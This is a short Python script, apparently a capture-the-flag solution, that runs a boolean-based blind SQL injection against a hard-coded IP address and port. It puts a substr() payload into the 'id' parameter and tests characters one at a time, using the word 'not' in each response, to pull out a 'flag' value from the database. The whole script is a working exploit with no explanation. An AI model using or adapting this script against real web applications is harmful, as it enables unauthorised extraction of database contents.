import requests

# base_url1 = "http://121.40.71.160:32785/BoolBasedSQLi.php?id=1' and substr((select flag from flag),1,1)='f"
sets = []
for i in range(ord('a'), ord('z') + 1):
    sets.append(chr(i))
for i in range(ord('A'), ord('Z') + 1):
    sets.append(chr(i))
for i in range(ord('0'), ord('9') + 1):
    sets.append(chr(i))
sets.append('{')
sets.append('}')
res = ''
for i in range(1, 38):
    for j in sets:
        base_url = "http://121.40.71.160:32785/BoolBasedSQLi.php?id=1' and substr((select flag from flag)," + str(
            i) + ",1)='" + j
        response = requests.get(base_url)
        if ('not' not in response.text):
            res += j
            break
print(res)
